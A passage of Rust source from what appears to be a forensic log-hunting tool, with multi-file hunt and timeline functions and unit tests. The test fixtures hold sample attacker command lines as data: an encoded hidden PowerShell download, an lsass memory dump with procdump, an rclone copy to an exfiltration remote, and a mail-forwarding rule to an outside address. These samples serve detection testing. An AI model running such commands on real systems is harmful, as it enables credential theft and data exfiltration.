        } else if !action_str.is_empty() {
            action_str.to_string()
        } else {
            "event recorded".to_string()
        };

        let mitre_tags = if !row.mitre_tags.is_empty() {
            format!(" [{}]", row.mitre_tags.join(" | "))
        } else {
            String::new()
        };

        lines.push(AnalystLine {
            text: format!("{time_part} [{}] — {actor_host_str}{action_display}{mitre_tags}", row.file_name),
            rows: vec![row.row_num],
        });
    }

    if total_count > MAX_NARRATED_TIMELINE_EVENTS {
        lines.push(AnalystLine {
            text: format!(
                "… and {} more events in sequence across {scanned_count} files.",
                total_count - MAX_NARRATED_TIMELINE_EVENTS
            ),
            rows: Vec::new(),
        });
    }

    let headline = format!(
        "Chronological timeline across {scanned_count} files: {total_count} events identified for {kw_desc}{span_summary}."
    );

    Ok(AnalystAnswer {
        intent: "timeline".to_string(),
        headline,
        sections: vec![AnalystSection {
            heading: "Keyword Timeline".to_string(),
            lines,
        }],
        steps: vec![AnalystStep {
            step: "multi_file_timeline".to_string(),
            status: "ran".to_string(),
            detail: format!("merged timeline from {scanned_count} files"),
        }],
        report_requested: false,
        use_guided_search: false,
        scan: None,
        anomalies: None,
        activity: None,
    })
}

pub fn multi_file_hunt(
    targets: &[FileTarget],
    ask_text: &str,
) -> Result<AnalystAnswer> {
    let (topic_name, patterns) = resolve_hunt_patterns(ask_text);

    struct CombinedHuntEvent {
        row_num: i64,
        file_name: String,
        epoch_ms: Option<i64>,
        utc_text: Option<String>,
        user: Option<String>,
        host: Option<String>,
        action: Option<String>,
        mitre_tags: Vec<String>,
    }

    let mut all_events: Vec<CombinedHuntEvent> = Vec::new();
    let mut file_all_names: Vec<String> = Vec::new();
    let mut file_match_counts: HashMap<String, usize> = HashMap::new();
    let mut file_row_ids: HashMap<String, Vec<i64>> = HashMap::new();
    let mut file_operations: HashMap<String, HashMap<String, usize>> = HashMap::new();
    let mut file_users: HashMap<String, HashSet<String>> = HashMap::new();
    let mut file_rule_details: HashMap<String, Vec<(String, i64)>> = HashMap::new();
    let mut file_mitre: HashMap<String, Vec<(String, String, i64, Vec<i64>)>> = HashMap::new();
    let mut scanned_count = 0;

    for target in targets {
        let file_name = std::path::Path::new(&target.path)
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_else(|| target.path.clone());
        let sheet_name = target.sheet.clone().unwrap_or_default();
        if !file_all_names.contains(&file_name) {
            file_all_names.push(file_name.clone());
        }

        let db_path = if let Some(ref p) = target.cache_db_path {
            let candidate = std::path::PathBuf::from(p);
            if candidate.exists() {
                candidate
            } else {
                db::cache_db_path(std::path::Path::new(&target.path), &sheet_name)
                    .unwrap_or_else(|_| std::path::PathBuf::from(p))
            }
        } else {
            match db::cache_db_path(std::path::Path::new(&target.path), &sheet_name) {
                Ok(p) => p,
                Err(_) => continue,
            }
        };

        if !db_path.exists() {
            continue;
        }

        let mut conn = match db::open(&db_path) {
            Ok(c) => c,
            Err(_) => continue,
        };

        let columns = match db::load_columns(&conn) {
            Ok(cols) => cols,
            Err(_) => continue,
        };

        if !row_time_available(&conn).unwrap_or(false) {
            let _ = time::normalize_timestamp_column_with_options(&mut conn, &columns, None, None);
        }

        let row_ids = match find_hunt_rows(&conn, &patterns, &columns) {
            Ok(ids) => ids,
            Err(_) => continue,
        };

        scanned_count += 1;

        if row_ids.is_empty() {
            continue;
        }

        file_match_counts.insert(file_name.clone(), row_ids.len());
        file_row_ids.insert(file_name.clone(), row_ids.clone());

        // Extract rule details if present in AuditData or Parameters
        let detail_col = columns.iter().find(|c| {
            let l = c.original_name.to_lowercase();
            l.contains("audit") || l.contains("param") || l.contains("detail") || l.contains("message")
        });
        if let Some(col) = detail_col {
            let ident = db::quote_ident(&col.sql_name);
            let sql = format!(
                "SELECT row_num, {ident} FROM rows WHERE {ident} IS NOT NULL AND TRIM({ident}) != '' LIMIT 60"
            );
            if let Ok(mut stmt) = conn.prepare(&sql) {
                if let Ok(details) = stmt.query_map([], |r| Ok((r.get::<_, i64>(0)?, r.get::<_, String>(1)?))) {
                    for (row_num, text) in details.flatten() {
                        if !row_ids.contains(&row_num) {
                            continue;
                        }
                        let mut extracted = Vec::new();
                        for key in &["ForwardTo", "RedirectTo", "ForwardAsAttachmentTo", "DeliverToMailboxAndForward", "Name", "RuleName", "TargetUser"] {
                            if let Some(pos) = text.to_lowercase().find(&key.to_lowercase()) {
                                let slice = &text[pos..];
                                let snippet: String = slice.chars().take(80).collect();
                                extracted.push(snippet);
                            }
                        }
                        if !extracted.is_empty() {
                            let desc = extracted.join("; ");
                            file_rule_details.entry(file_name.clone()).or_default().push((desc, row_num));
                            if file_rule_details.get(&file_name).map(|v| v.len()).unwrap_or(0) >= 3 {
                                break;
                            }
                        }
                    }
                }
            }
        }

        // Extract MITRE matches for this file
        if table_exists(&conn, "_intel_match").unwrap_or(false) {
            let sql = "SELECT technique_id, technique_name, COUNT(DISTINCT row_num), GROUP_CONCAT(DISTINCT row_num)
                       FROM _intel_match
                       GROUP BY technique_id, technique_name
                       ORDER BY COUNT(*) DESC LIMIT 5";
            if let Ok(mut stmt) = conn.prepare(sql) {
                if let Ok(techs) = stmt.query_map([], |r| {
                    let tid: String = r.get(0)?;
                    let tname: String = r.get(1)?;
                    let count: i64 = r.get(2)?;
                    let rows_str: String = r.get(3)?;
                    let rnums: Vec<i64> = rows_str
                        .split(',')
                        .filter_map(|s| s.parse::<i64>().ok())
                        .take(20)
                        .collect();
                    Ok((tid, tname, count, rnums))
                }) {
                    for item in techs.flatten() {
                        let matches_patterns = patterns.iter().any(|p| {
                            let pl = p.to_lowercase();
                            item.0.to_lowercase().contains(&pl) || item.1.to_lowercase().contains(&pl)
                        });
                        if matches_patterns {
                            file_mitre.entry(file_name.clone()).or_default().push(item);
                        }
                    }
                }
            }
        }

        let has_time = row_time_available(&conn).unwrap_or(false);
        let roles = load_active_roles(&conn).unwrap_or_default();
        let role_map: HashMap<String, String> = roles.into_iter().collect();

        let user_col = role_map.get("user").cloned().or_else(|| {
            columns
                .iter()
                .find(|c| {
                    let l = c.original_name.to_lowercase();
                    (l.contains("user") || l.contains("account") || l.contains("username") || l.contains("upn") || l.contains("actor"))
                        && !l.contains("hosted")
                })
                .map(|c| c.sql_name.clone())
        });

        let host_col = role_map.get("host").cloned().filter(|c| !c.to_lowercase().contains("hosted")).or_else(|| {
            columns
                .iter()
                .find(|c| {
                    let l = c.original_name.to_lowercase();
                    (l.contains("host")
                        || l.contains("computer")
                        || l.contains("workstation")
                        || l.contains("device")
                        || l.contains("machine"))
                        && !l.contains("hosted")
                        && !l.contains("ghost")
                })
                .map(|c| c.sql_name.clone())
        });

        let action_col = role_map
            .get("commandline")
            .cloned()
            .or_else(|| role_map.get("process_name").cloned())
            .or_else(|| {
                columns
                    .iter()
                    .find(|c| {
                        let l = c.original_name.to_lowercase();
                        (l.contains("operation")
                            || l.contains("activity")
                            || l.contains("command")
                            || l.contains("process")
                            || l.contains("action")
                            || l.contains("event_name")
                            || l.contains("eventname")
                            || l.contains("workload")
                            || l.contains("event")
                            || l.contains("message")
                            || l.contains("detail"))
                            && Some(&c.sql_name) != user_col.as_ref()
                            && Some(&c.sql_name) != host_col.as_ref()
                            && !l.contains("hosted")
                    })
                    .map(|c| c.sql_name.clone())
            })
            .or_else(|| {
                columns
                    .iter()
                    .find(|c| {
                        c.inferred_type == "text"
                            && Some(&c.sql_name) != user_col.as_ref()
                            && Some(&c.sql_name) != host_col.as_ref()
                            && !c.original_name.to_lowercase().contains("hosted")
                    })
                    .map(|c| c.sql_name.clone())
            });

        let _ = conn.execute(
            "CREATE TEMP TABLE IF NOT EXISTS _timeline_temp (row_num INTEGER PRIMARY KEY)",
            [],
        );
        let _ = conn.execute("DELETE FROM _timeline_temp", []);
        if let Ok(mut insert_stmt) =
            conn.prepare("INSERT OR IGNORE INTO _timeline_temp (row_num) VALUES (?1)")
        {
            for r in &row_ids {
                let _ = insert_stmt.execute([r]);
            }
        }

        let user_sql = user_col
            .as_ref()
            .map(|c| format!(", r.{}", db::quote_ident(c)))
            .unwrap_or_default();
        let host_sql = host_col
            .as_ref()
            .map(|c| format!(", r.{}", db::quote_ident(c)))
            .unwrap_or_default();
        let action_sql = action_col
            .as_ref()
            .map(|c| format!(", r.{}", db::quote_ident(c)))
            .unwrap_or_default();

        let query = if has_time {
            format!(
                "SELECT r.row_num, rt.epoch_ms, rt.utc_text {user_sql} {host_sql} {action_sql}
                 FROM _timeline_temp t
                 JOIN rows r ON r.row_num = t.row_num
                 LEFT JOIN _row_time rt ON rt.row_num = r.row_num
                 ORDER BY COALESCE(rt.epoch_ms, 9223372036854775807) ASC, r.row_num ASC"
            )
        } else {
            format!(
                "SELECT r.row_num, NULL, NULL {user_sql} {host_sql} {action_sql}
                 FROM _timeline_temp t
                 JOIN rows r ON r.row_num = t.row_num
                 ORDER BY r.row_num ASC"
            )
        };

        let mut intel_map: HashMap<i64, Vec<String>> = HashMap::new();
        if table_exists(&conn, "_intel_match").unwrap_or(false) {
            let intel_query = "SELECT m.row_num, m.technique_id, m.technique_name
                 FROM _intel_match m
                 JOIN _timeline_temp t ON t.row_num = m.row_num
                 ORDER BY m.score DESC";
            let mut stmt = conn.prepare(intel_query);
            if let Ok(ref mut s) = stmt {
                if let Ok(rows) = s.query_map([], |r| {
                    Ok((
                        r.get::<_, i64>(0)?,
                        r.get::<_, String>(1)?,
                        r.get::<_, String>(2)?,
                    ))
                }) {
                    for item in rows.flatten() {
                        let entry = intel_map.entry(item.0).or_default();
                        if entry.len() < 2 {
                            entry.push(format!("{} {}", item.1, item.2));
                        }
                    }
                }
            }
        }

        let mut col_offset = 3;
        let user_idx = if user_col.is_some() {
            let idx = col_offset;
            col_offset += 1;
            Some(idx)
        } else {
            None
        };
        let host_idx = if host_col.is_some() {
            let idx = col_offset;
            col_offset += 1;
            Some(idx)
        } else {
            None
        };
        let action_idx = if action_col.is_some() {
            let idx = col_offset;
            Some(idx)
        } else {
            None
        };

        {
            let mut stmt = conn.prepare(&query);
            if let Ok(ref mut s) = stmt {
                if let Ok(rows) = s.query_map([], |r| {
                    let user = user_idx.and_then(|idx| r.get::<_, Option<String>>(idx).ok().flatten());
                    let host = host_idx.and_then(|idx| r.get::<_, Option<String>>(idx).ok().flatten());
                    let action = action_idx.and_then(|idx| r.get::<_, Option<String>>(idx).ok().flatten());
                    Ok((
                        r.get::<_, i64>(0)?,
                        r.get::<_, Option<i64>>(1)?,
                        r.get::<_, Option<String>>(2)?,
                        user,
                        host,
                        action,
                    ))
                }) {
                    for r in rows.flatten() {
                        let row_num = r.0;
                        let tags = intel_map.get(&row_num).cloned().unwrap_or_default();
                        if let Some(ref u) = r.3 {
                            if !u.trim().is_empty() {
                                file_users.entry(file_name.clone()).or_default().insert(u.clone());
                            }
                        }
                        if let Some(ref a) = r.5 {
                            if !a.trim().is_empty() {
                                *file_operations.entry(file_name.clone()).or_default().entry(a.clone()).or_insert(0) += 1;
                            }
                        }
                        all_events.push(CombinedHuntEvent {
                            row_num,
                            file_name: file_name.clone(),
                            epoch_ms: r.1,
                            utc_text: r.2,
                            user: r.3,
                            host: r.4,
                            action: r.5,
                            mitre_tags: tags,
                        });
                    }
                }
            }
        }
    }

    if all_events.is_empty() {
        return Ok(AnalystAnswer {
            intent: "hunt".to_string(),
            headline: format!("No events found matching '{topic_name}' across {scanned_count} loaded file(s)."),
            sections: vec![AnalystSection {
                heading: format!("Hunt Findings: {topic_name}"),
                lines: vec![AnalystLine {
                    text: format!("No events matching '{topic_name}' were identified across {scanned_count} loaded file(s)."),
                    rows: Vec::new(),
                }],
            }],
            steps: vec![AnalystStep {
                step: "multi_file_hunt".to_string(),
                status: "ran".to_string(),
                detail: format!("scanned {scanned_count} files, 0 matches"),
            }],
            report_requested: false,
            use_guided_search: false,
            scan: None,
            anomalies: None,
            activity: None,
        });
    }

    // Sort chronologically across files
    all_events.sort_by(|a, b| {
        match (a.epoch_ms, b.epoch_ms) {
            (Some(ea), Some(eb)) => ea.cmp(&eb),
            (Some(_), None) => std::cmp::Ordering::Less,
            (None, Some(_)) => std::cmp::Ordering::Greater,
            (None, None) => a.file_name.cmp(&b.file_name).then(a.row_num.cmp(&b.row_num)),
        }
    });

    let total_events = all_events.len();

    // Build Findings section
    let mut findings_lines = Vec::new();
    let file_summaries: Vec<String> = file_match_counts
        .iter()
        .map(|(fname, count)| format!("{fname} ({count} events)"))
        .collect();
    findings_lines.push(AnalystLine {
        text: format!(
            "Identified {total_events} event(s) matching '{topic_name}' across {} file(s) (scanned {scanned_count} files): {}.",
            file_match_counts.len(),
            file_summaries.join(", ")
        ),
        rows: Vec::new(),
    });

    for fname in &file_all_names {
        if let Some(_count) = file_match_counts.get(fname) {
            let all_file_rows = file_row_ids.get(fname).cloned().unwrap_or_default();
            if let Some(ops) = file_operations.get(fname) {
                let op_descs: Vec<String> = ops.iter().map(|(op, c)| format!("'{op}' ({c})")).collect();
                findings_lines.push(AnalystLine {
                    text: format!("[{fname}] Operations: {}.", op_descs.join(", ")),
                    rows: all_file_rows.clone(),
                });
            }
            if let Some(details) = file_rule_details.get(fname) {
                for (desc, rnum) in details {
                    findings_lines.push(AnalystLine {
                        text: format!("[{fname}] Rule / action detail: {desc}"),
                        rows: vec![*rnum],
                    });
                }
            }
            if let Some(mitre_items) = file_mitre.get(fname) {
                for (tid, tname, count, rnums) in mitre_items {
                    findings_lines.push(AnalystLine {
                        text: format!("[{fname}] MITRE ATT&CK: {tname} ({tid}) — {count} matching row(s)."),
                        rows: rnums.clone(),
                    });
                }
            }
            if let Some(users) = file_users.get(fname) {
                let user_list: Vec<String> = users.iter().cloned().collect();
                findings_lines.push(AnalystLine {
                    text: format!("[{fname}] Involved users: {}.", user_list.join(", ")),
                    rows: Vec::new(),
                });
            }
        } else {
            findings_lines.push(AnalystLine {
                text: format!("[{fname}] 0 matching events found for '{topic_name}'."),
                rows: Vec::new(),
            });
        }
    }

    let findings_sec = AnalystSection {
        heading: format!("Hunt Findings: {topic_name}"),
        lines: findings_lines,
    };

    // Build Timeline section
    let mut tl_lines = Vec::new();
    tl_lines.push(AnalystLine {
        text: format!("Chronological sequence of {total_events} matching event(s) across all files:"),
        rows: Vec::new(),
    });

    for ev in all_events.iter().take(MAX_NARRATED_TIMELINE_EVENTS) {
        let time_str = ev.utc_text.as_deref().unwrap_or("Timestamp not available");
        let mut details = Vec::new();
        if let Some(ref u) = ev.user {
            if !u.trim().is_empty() { details.push(format!("user {u}")); }
        }
        if let Some(ref h) = ev.host {
            if !h.trim().is_empty() { details.push(format!("on host {h}")); }
        }
        let actor_host = if details.is_empty() { String::new() } else { format!("{}: ", details.join(" ")) };
        let action = ev.action.as_deref().unwrap_or("event recorded");
        let tags = if ev.mitre_tags.is_empty() { String::new() } else { format!(" [{}]", ev.mitre_tags.join(" | ")) };

        tl_lines.push(AnalystLine {
            text: format!("{time_str} [{}] — {actor_host}{action}{tags}", ev.file_name),
            rows: vec![ev.row_num],
        });
    }

    if total_events > MAX_NARRATED_TIMELINE_EVENTS {
        tl_lines.push(AnalystLine {
            text: format!("… and {} more events across files.", total_events - MAX_NARRATED_TIMELINE_EVENTS),
            rows: Vec::new(),
        });
    }

    let timeline_sec = AnalystSection {
        heading: format!("Keyword Timeline: {topic_name}"),
        lines: tl_lines,
    };

    Ok(AnalystAnswer {
        intent: "hunt".to_string(),
        headline: format!("Investigative Hunt: {total_events} event(s) identified for '{topic_name}' across {} file(s).", file_match_counts.len()),
        sections: vec![findings_sec, timeline_sec],
        steps: vec![AnalystStep {
            step: "multi_file_hunt".to_string(),
            status: "ran".to_string(),
            detail: format!("scanned {} files, {total_events} matching events", file_match_counts.len()),
        }],
        report_requested: false,
        use_guided_search: false,
        scan: None,
        anomalies: None,
        activity: None,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::db::ImportInfo;

    #[test]
    fn classification_covers_the_users_example_asks() {
        assert_eq!(classify_ask("what is in this xls"), AnalystIntent::Profile);
        assert_eq!(classify_ask("map this on mitre"), AnalystIntent::Map);
        assert_eq!(classify_ask("find chained activity"), AnalystIntent::Chains);
        assert_eq!(
            classify_ask("make chronological attack report"),
            AnalystIntent::Report
        );
        assert_eq!(
            classify_ask("find anything suspicious in a dfir manner"),
            AnalystIntent::Map
        );
        assert_eq!(classify_ask("what happened here?"), AnalystIntent::Profile);
        assert_eq!(
            classify_ask("parse this xls and find me row by row what activity is there"),
            AnalystIntent::Profile
        );
        assert_eq!(
            classify_ask("filter me this xls by the attacks of this user"),
            AnalystIntent::Search
        );
        assert_eq!(
            classify_ask("filter rows for alice"),
            AnalystIntent::Search
        );
        assert_eq!(
            classify_ask("mimikatz alice"),
            AnalystIntent::Hunt
        );
        assert_eq!(
            classify_ask("inbox rules"),
            AnalystIntent::Hunt
        );
        assert_eq!(
            classify_ask("inbox forwarding rules and consent grants"),
            AnalystIntent::Hunt
        );
        assert_eq!(
            classify_ask("timeline for powershell, alice"),
            AnalystIntent::Timeline
        );
        assert_eq!(
            classify_ask("chronology of mimikatz"),
            AnalystIntent::Timeline
        );
        assert_eq!(
            classify_ask("sequence of events for 192.168.1.5"),
            AnalystIntent::Timeline
        );
    }

    fn fixture() -> (Connection, Vec<ColumnMeta>) {
        let conn = Connection::open_in_memory().unwrap();
        let columns = vec![
            ColumnMeta {
                sql_name: "timegenerated".into(),
                original_name: "TimeGenerated".into(),
                col_index: 0,
                inferred_type: "timestamp".into(),
            },
            ColumnMeta {
                sql_name: "account".into(),
                original_name: "Account".into(),
                col_index: 1,
                inferred_type: "text".into(),
            },
            ColumnMeta {
                sql_name: "computer".into(),
                original_name: "Computer".into(),
                col_index: 2,
                inferred_type: "text".into(),
            },
            ColumnMeta {
                sql_name: "commandline".into(),
                original_name: "CommandLine".into(),
                col_index: 3,
                inferred_type: "text".into(),
            },
        ];
        db::create_schema(&conn, &columns).unwrap();
        db::record_import_info(
            &conn,
            &ImportInfo {
                source_path: "C:\\cases\\incident.xlsx".to_string(),
                sheet_name: "Sentinel".to_string(),
                row_count: 6,
                imported_at: "2026-07-19T00:00:00Z".to_string(),
            },
        )
        .unwrap();
        let rows = [
            (1, "2026-01-05T09:00:00Z", "CORP\\eve", "WS-07", "powershell.exe -nop -w hidden -enc SQBFAFgAJwBoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA3AC8AYQAnACkA"),
            (2, "2026-01-05T09:05:00Z", "CORP\\eve", "WS-07", "whoami /all"),
            (3, "2026-01-05T09:12:00Z", "CORP\\eve", "WS-07", "procdump.exe -ma lsass.exe C:\\Users\\Public\\l.dmp"),
            (4, "2026-01-05T09:30:00Z", "CORP\\eve", "WS-07", "rclone copy C:\\Users\\Public\\staging remote:exfil"),
            (5, "2026-01-05T10:00:00Z", "CORP\\dave", "WS-02", "notepad.exe C:\\notes\\todo.txt"),
            (6, "2026-01-05T10:05:00Z", "CORP\\dave", "WS-02", "ping 127.0.0.1"),
        ];
        for (row_num, ts, account, computer, cmd) in rows {
            conn.execute(
                "INSERT INTO rows (row_num, timegenerated, account, computer, commandline)
                 VALUES (?1, ?2, ?3, ?4, ?5)",
                rusqlite::params![row_num, ts, account, computer, cmd],
            )
            .unwrap();
        }
        (conn, columns)
    }

    #[test]
    fn profile_ask_runs_the_whole_pipeline_and_names_the_actor() {
        let (mut conn, columns) = fixture();
        let mut phases = Vec::new();
        let answer = ask(&mut conn, &columns, "what is in this file?", |phase| {
            phases.push(phase.to_string())
        })
        .unwrap();

        assert_eq!(answer.intent, "profile");
        assert!(!answer.report_requested);
        assert!(!answer.use_guided_search);
        assert!(phases.contains(&"mitre-scan".to_string()));

        let step_status: HashMap<&str, &str> = answer
            .steps
            .iter()
            .map(|step| (step.step.as_str(), step.status.as_str()))
            .collect();
        assert_eq!(step_status.get("data_mapping"), Some(&"ran"));
        assert_eq!(step_status.get("timeline"), Some(&"ran"));
        assert_eq!(step_status.get("mitre_scan"), Some(&"ran"));
        assert_eq!(step_status.get("anomaly_scan"), Some(&"ran"));
        assert_eq!(step_status.get("activity"), Some(&"ran"));

        let activity = answer.activity.as_ref().expect("activity summary");
        assert_eq!(activity.rows_classified, 6);
        assert!(answer
            .sections
            .iter()
            .any(|section| section.heading == "Activity, row by row"));

        let scan = answer.scan.as_ref().expect("scan summary");
        assert!(scan.match_count > 0, "curated scan should hit planted rows");
        assert!(
            !scan.chains.is_empty(),
            "multi-tactic activity on WS-07 within one hour should chain"
        );
        assert_eq!(scan.chains[0].host.as_deref(), Some("WS-07"));

        let anomalies = answer.anomalies.as_ref().expect("anomaly summary");
        assert!(anomalies.flagged_rows > 0);

        assert!(answer.headline.contains("WS-07"), "{}", answer.headline);
        let all_text: String = answer
            .sections
            .iter()
            .flat_map(|section| section.lines.iter())
            .map(|line| line.text.clone())
            .collect::<Vec<_>>()
            .join(" ");
        assert!(all_text.contains("CORP\\eve"), "{all_text}");
        assert!(all_text.contains("incident.xlsx"), "{all_text}");
        // Grounding: cited rows must exist in the data.
        for section in &answer.sections {
            for line in &section.lines {
                for row in &line.rows {
                    assert!((1..=6).contains(row), "cited row {row} outside dataset");
                }
            }
        }
    }

    #[test]
    fn profile_ask_reports_an_ignore_rules_step() {
        let mut conn = Connection::open_in_memory().unwrap();
        let columns = vec![db::ColumnMeta {
            sql_name: "processname".into(),
            original_name: "ProcessName".into(),
            col_index: 0,
            inferred_type: "text".into(),
        }];
        db::create_schema(&conn, &columns).unwrap();
        db::create_column_roles_table(&conn).unwrap();
        conn.execute(
            "INSERT INTO _column_roles (role, sql_name, confidence, status, reasons_json)
             VALUES ('process_name', 'processname', 1.0, 'confirmed', '[]')",
            [],
        )
        .unwrap();
        crate::db::create_ignore_rule_state_schema(&conn).unwrap();
        conn.execute(
            "INSERT INTO _custom_ignore_rules (id, name, enabled, conditions_json)
             VALUES ('qualys-agent-activity', 'Qualys Cloud Agent process activity', 1,
                     '[{\"role\":\"process_name\",\"op\":\"contains_any\",\"values\":[\"qualys\"]}]')",
            [],
        )
        .unwrap();
        conn.execute(
            "INSERT INTO rows (row_num, processname) VALUES
             (1, 'QualysAgent.exe'), (2, 'winlogon.exe'), (3, 'explorer.exe')",
            [],
        )
        .unwrap();

        let answer = ask(&mut conn, &columns, "what is in this file?", |_| {}).unwrap();
        let ignore_step = answer
            .steps
            .iter()
            .find(|step| step.step == "ignore_rules")
            .expect("ignore_rules step must always be present");
        assert_eq!(ignore_step.status, "ran");
        assert!(
            ignore_step.detail.contains("1 row(s)")
                && ignore_step.detail.contains("Qualys Cloud Agent process activity"),
            "{}",
            ignore_step.detail
        );
        assert_eq!(answer.activity.as_ref().unwrap().rows_ignored, 1);
        assert_eq!(answer.anomalies.as_ref().unwrap().rows_ignored, 1);
    }

    #[test]
    fn report_ask_flags_report_generation() {
        let (mut conn, columns) = fixture();
        let answer = ask(&mut conn, &columns, "make me an attack report", |_| {}).unwrap();
        assert_eq!(answer.intent, "report");
        assert!(answer.report_requested);
    }

    #[test]
    fn search_ask_falls_back_without_running_the_pipeline() {
        let (mut conn, columns) = fixture();
        let answer = ask(&mut conn, &columns, "filter rows for alice", |_| {}).unwrap();
        assert_eq!(answer.intent, "search");
        assert!(answer.use_guided_search);
        assert!(answer.steps.is_empty());
        assert!(answer.scan.is_none());
    }

    #[test]
    fn keyword_timeline_generates_chronological_events() {
        let (mut conn, columns) = fixture();
        let answer = ask(&mut conn, &columns, "timeline for powershell, alice", |_| {}).unwrap();
        assert_eq!(answer.intent, "timeline");
        // Verify ONLY 1 section is returned (the timeline section) - no appended automated report!
        assert_eq!(answer.sections.len(), 1);
        assert_eq!(answer.sections[0].heading, "Keyword Timeline");
        let tl_section = &answer.sections[0];
        assert!(!tl_section.lines.is_empty());
        // First line contains all matching row IDs for filtering
        assert!(!tl_section.lines[0].rows.is_empty());
        // Headline mentions the count and keywords
        assert!(answer.headline.contains("Chronological timeline"));
    }

    #[test]
    fn quick_prompts_produce_differentiated_sections() {
        let (mut conn, columns) = fixture();

        // 1. "What is in this file?" (Profile intent) -> Dataset & Activity
        let profile_answer = ask(&mut conn, &columns, "what is in this file?", |_| {}).unwrap();
        assert_eq!(profile_answer.intent, "profile");
        let profile_headings: Vec<&str> = profile_answer.sections.iter().map(|s| s.heading.as_str()).collect();
        assert!(profile_headings.contains(&"Dataset"));
        assert!(profile_headings.contains(&"Activity, row by row"));
        assert!(!profile_headings.contains(&"Keyword Timeline"));

        // 2. "Map to MITRE" (Map intent) -> MITRE ATT&CK mapping & Attack chains
        let map_answer = ask(&mut conn, &columns, "map this to MITRE ATT&CK", |_| {}).unwrap();
        assert_eq!(map_answer.intent, "map");
        let map_headings: Vec<&str> = map_answer.sections.iter().map(|s| s.heading.as_str()).collect();
        assert!(map_headings.contains(&"MITRE ATT&CK mapping"));
        assert!(map_headings.contains(&"Attack chains"));
        assert!(!map_headings.contains(&"Dataset"));
        assert!(!map_headings.contains(&"Activity, row by row"));

        // 3. "Find chained activity" (Chains intent) -> Attack chains first
        let chains_answer = ask(&mut conn, &columns, "find chained activity", |_| {}).unwrap();
        assert_eq!(chains_answer.intent, "chains");
        let chains_headings: Vec<&str> = chains_answer.sections.iter().map(|s| s.heading.as_str()).collect();
        assert_eq!(chains_headings[0], "Attack chains");
        assert!(!chains_headings.contains(&"Dataset"));

        // 4. "Timeline" -> Timeline ONLY
        let tl_answer = ask(&mut conn, &columns, "timeline of suspicious events", |_| {}).unwrap();
        assert_eq!(tl_answer.intent, "timeline");
        assert_eq!(tl_answer.sections.len(), 1);
        assert_eq!(tl_answer.sections[0].heading, "Keyword Timeline");
    }

    #[test]
    fn m365_ual_column_heuristics_excludes_hosted_and_picks_operation() {
        let conn = Connection::open_in_memory().unwrap();
        let columns = vec![
            db::ColumnMeta {
                sql_name: "recordtype".into(),
                original_name: "RecordType".into(),
                col_index: 0,
                inferred_type: "text".into(),
            },
            db::ColumnMeta {
                sql_name: "creationdate".into(),
                original_name: "CreationDate".into(),
                col_index: 1,
                inferred_type: "timestamp".into(),
            },
            db::ColumnMeta {
                sql_name: "userids".into(),
                original_name: "UserId".into(),
                col_index: 2,
                inferred_type: "text".into(),
            },
            db::ColumnMeta {
                sql_name: "operation".into(),
                original_name: "Operation".into(),
                col_index: 3,
                inferred_type: "text".into(),
            },
            db::ColumnMeta {
                sql_name: "hosted".into(),
                original_name: "Hosted".into(),
                col_index: 4,
                inferred_type: "text".into(),
            },
        ];
        db::create_schema(&conn, &columns).unwrap();
        db::create_column_roles_table(&conn).unwrap();
        db::create_row_time_table(&conn).unwrap();

        conn.execute(
            "INSERT INTO rows (row_num, recordtype, creationdate, userids, operation, hosted)
             VALUES (1, 'ExchangeItem', '2024-03-24T14:10:02Z', 'alice@corp.com', 'New-InboxRule', 'No')",
            [],
        )
        .unwrap();
        conn.execute(
            "INSERT INTO _row_time (row_num, epoch_ms, utc_text, source_text, parse_status)
             VALUES (1, 1711289402000, '2024-03-24 14:10:02 UTC', '2024-03-24T14:10:02Z', 'parsed')",
            [],
        )
        .unwrap();

        let (section, summary) = timeline_section(&conn, &columns, &["inboxrule".into()], &[1]).unwrap();
        assert!(summary.is_some());
        assert_eq!(section.lines.len(), 2);
        let event_line = &section.lines[1].text;
        // Verify Hosted="No" is NOT displayed as a host name ("on host No")!
        assert!(!event_line.contains("on host No"), "Hosted boolean flag must not be treated as host! Line: {event_line}");
        // Verify Operation="New-InboxRule" is picked as the action!
        assert!(event_line.contains("New-InboxRule"), "Operation column should be picked as action! Line: {event_line}");
        assert!(event_line.contains("user alice@corp.com"), "UserId should be picked as user! Line: {event_line}");
    }

    #[test]
    fn hunt_ask_inbox_rules_finds_operations_and_generates_hunt_and_timeline() {
        let mut conn = Connection::open_in_memory().unwrap();
        let columns = vec![
            db::ColumnMeta {
                sql_name: "recordtype".into(),
                original_name: "RecordType".into(),
                col_index: 0,
                inferred_type: "text".into(),
            },
            db::ColumnMeta {
                sql_name: "creationdate".into(),
                original_name: "CreationDate".into(),
                col_index: 1,
                inferred_type: "timestamp".into(),
            },
            db::ColumnMeta {
                sql_name: "userids".into(),
                original_name: "UserId".into(),
                col_index: 2,
                inferred_type: "text".into(),
            },
            db::ColumnMeta {
                sql_name: "operation".into(),
                original_name: "Operation".into(),
                col_index: 3,
                inferred_type: "text".into(),
            },
            db::ColumnMeta {
                sql_name: "parameters".into(),
                original_name: "Parameters".into(),
                col_index: 4,
                inferred_type: "text".into(),
            },
        ];
        db::create_schema(&conn, &columns).unwrap();
        db::create_column_roles_table(&conn).unwrap();
        db::create_row_time_table(&conn).unwrap();

        conn.execute(
            "INSERT INTO rows (row_num, recordtype, creationdate, userids, operation, parameters)
             VALUES
             (1, 'ExchangeItem', '2024-03-24T14:10:02Z', 'attacker@external.com', 'New-InboxRule', 'ForwardTo=exfil@hacker.com;Name=ForwardSpam'),
             (2, 'ExchangeItem', '2024-03-24T14:15:00Z', 'attacker@external.com', 'Set-InboxRule', 'Name=ForwardSpam;DeleteMessage=true'),
             (3, 'AzureActiveDirectory', '2024-03-24T14:20:00Z', 'attacker@external.com', 'Consent to application', 'AppId=fake-app-guid')",
            [],
        )
        .unwrap();

        conn.execute(
            "INSERT INTO _row_time (row_num, epoch_ms, utc_text, source_text, parse_status)
             VALUES
             (1, 1711289402000, '2024-03-24 14:10:02 UTC', '2024-03-24T14:10:02Z', 'parsed'),
             (2, 1711289700000, '2024-03-24 14:15:00 UTC', '2024-03-24T14:15:00Z', 'parsed'),
             (3, 1711290000000, '2024-03-24 14:20:00 UTC', '2024-03-24T14:20:00Z', 'parsed')",
            [],
        )
        .unwrap();

        let answer = ask(&mut conn, &columns, "inbox rules", |_| {}).unwrap();
        assert_eq!(answer.intent, "hunt");
        assert!(!answer.use_guided_search);
